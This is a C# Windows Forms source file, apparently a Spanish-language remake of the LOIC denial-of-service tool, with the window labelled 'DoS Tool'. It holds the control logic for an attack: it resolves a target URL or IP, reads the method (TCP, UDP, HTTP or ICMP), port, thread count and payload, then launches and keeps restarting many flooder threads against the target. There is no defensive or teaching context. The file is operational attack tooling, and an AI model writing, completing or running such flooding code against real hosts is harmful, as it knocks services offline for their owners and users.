using System;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Windows.Forms;

namespace LOIC
{
	public partial class atlaspanel : Form
	{
		#region Fields
		private bool attack;
		private static IFlooder[] arr;

		private static string sIP, sData, sSubsite;
		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
		private static bool bResp, intShowStats;
		#endregion

		#region Constructors
		public atlaspanel()
		{
			InitializeComponent();
		}
		#endregion

		#region Event handlers
		private void frmMain_Load(object sender, EventArgs e)
		{
			this.Text = String.Format("{0} | DoS Tool - Probando tus Cores - Version {1} RMK", Application.ProductName, Application.ProductVersion);
		}

		private void cmdTargetURL_Click(object sender, EventArgs e)
		{
			string url = txtTargetURL.Text.ToLower();
			if (url.Length == 0)
			{
					MessageBox.Show("URL Erronea, corrije la URL", "Error n00b");
				                                                                   /* Parte de la Resolucion Directa del DNS de la URL de la pagina*/
				return;
			}

			if (!url.StartsWith("http://") && !url.StartsWith("https://")) url = String.Concat("http://", url);
			try
			{
				IPAddress[] addresses = Dns.GetHostEntry(new Uri(url).Host).AddressList;
				txtTarget.Text = (addresses.Length > 1 ? addresses[new Random().Next(addresses.Length)] : addresses.First()).ToString();
            }
			catch
			{

					MessageBox.Show("Ingrese la IP completamente", "Error n00b.");
			}  
		}

		private void cmdTargetIP_Click(object sender, EventArgs e)
		{
            if (txtTargetIP.Text.Length == 0)
			{
					MessageBox.Show("Ingresa la IP si no no funciona pendejo.", "Error n00b");
				return;
			}
			txtTarget.Text = txtTargetIP.Text;
            

		}

		private void txtTarget_Enter(object sender, EventArgs e)
		{
			cmdAttack.Focus();
		}

		private void cmdAttack_Click(object sender, EventArgs e)
		{
			if (!attack)
			{
				attack = true;
				try
				{
					sIP = txtTarget.Text;

					if (!Int32.TryParse(txtPort.Text, out iPort))
						throw new Exception("La Informacion de Puerto de Ataque es Incorrecta");

					if (!Int32.TryParse(txtThreads.Text, out iThreads))
						throw new Exception("Que te pasa, como vas a poner esa cantidad en AS?");

					if (String.IsNullOrEmpty(txtTarget.Text) || String.Equals(txtTarget.Text, "ATLAS"))
						throw new Exception("Selecciona un Objetivo porfavor");

					iProtocol = 0;
					switch (cbMethod.Text)
					{
						case "TCP":
                            iProtocol = 1;
                            break;
						case "UDP":
                            iProtocol = 2;
                            break;
						case "HTTP":
                            iProtocol = 3;
                            break;
                        case "ICMP":
                            iProtocol = 4;
                            break;
						default:

                            throw new Exception("Selecciona un metodo de Ataque antes de todo.");
					}

					sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
					if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
						throw new Exception("Que estas haciendo brotherrr , todo un n00b corrije el error");

					if (!txtSubsite.Text.StartsWith("/") && (iProtocol == 3))
						throw new Exception("Tenes que poner la direccion a n sub-sitio de una WEB");
					else
						sSubsite = txtSubsite.Text;

					if (!Int32.TryParse(txtTimeout.Text, out iTimeout))
						throw new Exception("Corrige el Tiempo de Espera de Respuesta porfavor =S");

					bResp = chkResp.Checked;
				}
				catch (Exception ex)
				{

						MessageBox.Show(ex.Message, "Error n00b");
					attack = false;
					return;
				}

				cmdAttack.Text = "Detener Flooding";

				switch (iProtocol)
				{
					case 1:
					case 2:
						{
							arr = Enumerable.Range(0, iThreads)
								.Select(i => new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData))
								.ToArray();
							break;
						}
					case 3:
						{
							arr = Enumerable.Range(0, iThreads)
								.Select(i => new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout))
								.ToArray();
							break;
						}
                    case 4:
                        {
                            arr = Enumerable.Range(0, iThreads)
                                .Select(i => new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout))
                                .ToArray();
                            break;
                        }
				}

				foreach (IFlooder f in arr)
				{
					f.Start();
				}
				tShowStats.Start();
			}
			else
			{
				attack = false;
				cmdAttack.Text = "Iniciar Flooding";

				foreach (IFlooder f in arr)
				{
					f.Stop();
				}
				tShowStats.Stop();

				arr = null;
			}
		}

		private void tShowStats_Tick(object sender, EventArgs e)
		{
			if (intShowStats) return; intShowStats = true;

			bool isFlooding = false;
			switch (iProtocol)
			{
				case 1:
				case 2:
					{
						int iFloodCount = arr.Cast<XXPFlooder>().Sum(f => f.FloodCount);
						lbRequested.Text = iFloodCount.ToString(CultureInfo.InvariantCulture);
						break;
					}
				case 3:
					{
						int iIdle = 0;
						int iConnecting = 0;
						int iRequesting = 0;
						int iDownloading = 0;
						int iDownloaded = 0;
						int iRequested = 0;
						int iFailed = 0;
                                                                                    // Clase de for del Profesor Bernardo jajajajaja :)
						for (int a = 0; a < arr.Length; a++)                        //  Sirve Sirve
						{
							HTTPFlooder httpFlooder = (HTTPFlooder)arr[a];
							iDownloaded += httpFlooder.Downloaded;
							iRequested += httpFlooder.Requested;
							iFailed += httpFlooder.Failed;
							switch (httpFlooder.State)
							{
								case ReqState.Ready:
								case ReqState.Completed:
									{
										iIdle++;
										break;
									}
								case ReqState.Connecting:
									{
										iConnecting++;
										break;
									}
								case ReqState.Requesting:
									{
										iRequesting++;
										break;
									}
								case ReqState.Downloading:
									{
										iDownloading++;
										break;
									}
							}
							if (isFlooding && !httpFlooder.IsFlooding)
							{
								int iaDownloaded = httpFlooder.Downloaded;
								int iaRequested = httpFlooder.Requested;
								int iaFailed = httpFlooder.Failed;
								httpFlooder = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
								{
									Downloaded = iaDownloaded,
									Requested = iaRequested,
									Failed = iaFailed
								};
								httpFlooder.Start();
								arr[a] = httpFlooder;
							}
						}
						lbFailed.Text = iFailed.ToString(CultureInfo.InvariantCulture);
						lbRequested.Text = iRequested.ToString(CultureInfo.InvariantCulture);
						lbDownloaded.Text = iDownloaded.ToString(CultureInfo.InvariantCulture);
						lbDownloading.Text = iDownloading.ToString(CultureInfo.InvariantCulture);
						lbRequesting.Text = iRequesting.ToString(CultureInfo.InvariantCulture);
						lbConnecting.Text = iConnecting.ToString(CultureInfo.InvariantCulture);
						lbIdle.Text = iIdle.ToString(CultureInfo.InvariantCulture);
						break;
					}
			}

			intShowStats = false;
		}

		private void tbSpeed_ValueChanged(object sender, EventArgs e)
		{
			iDelay = tbSpeed.Value;
			if (arr != null)
			{
				foreach (var f in arr)
				{
					f.Delay = iDelay;
				}
			}
		}
		#endregion

        private void txtTargetIP_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void tbSpeed_Scroll(object sender, EventArgs e)
        {

        }

        private void chkResp_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void txtTargetURL_TextChanged(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void lbRequesting_Click(object sender, EventArgs e)
        {

        }

        private void toolStripStatusLabel3_Click(object sender, EventArgs e)
        {

        }

        private void toolStripStatusLabel1_Click(object sender, EventArgs e)
        {
           
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void groupBox5_Enter(object sender, EventArgs e)
        {

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void btnSalir_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void txtTarget_TextChanged(object sender, EventArgs e)
        {
            txtTargetIP.Text = txtTarget.Text;
        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void label15_Click(object sender, EventArgs e)
        {

        }

        private void lbConnecting_Click(object sender, EventArgs e)
        {

        }

        private void lbDownloaded_Click(object sender, EventArgs e)
        {

        }

        private void informacionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            acercade i = new acercade();
            i.Show();
        }

        private void txtPort_TextChanged(object sender, EventArgs e)
        {

        }
	}
}
